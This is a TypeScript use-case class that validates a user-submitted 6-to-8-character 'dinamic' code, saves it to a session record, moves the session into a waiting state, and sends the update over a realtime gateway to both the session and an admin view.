import { ActionState } from "@prisma/client";
import { type SessionRepository } from "../ports/SessionRepository.js";
import { type RealtimeGateway } from "../ports/RealtimeGateway.js";
import { SessionPolicy } from "../../domain/session/SessionPolicy.js";

export class UserSubmitDinamic {
  constructor(
    private repo: SessionRepository,
    private rt: RealtimeGateway
  ) {}

  async execute(input: { sessionId: string; dinamic: string }) {
    const dinamic = input.dinamic.trim();

    if (dinamic.length < 6 || dinamic.length > 8) {
      return { ok: false as const, error: "invalid_code" };
    }

    const s = await this.repo.findById(input.sessionId);
    if (!s) return { ok: false as const, error: "not_found" };

    if (!SessionPolicy.canUserSubmitDinamic(s.action)) {
      return { ok: false as const, error: "bad_state" };
    }

    await this.repo.update(input.sessionId, {
      dinamic,
      action: ActionState.DINAMIC_WAIT_ACTION,
      lastError: null,
    });

    const updated = await this.repo.findById(input.sessionId);
    if (updated) {
      this.rt.emitSessionUpdate(input.sessionId, updated);
      this.rt.emitAdminUpsert(updated);
    }

    return { ok: true as const };
  }
}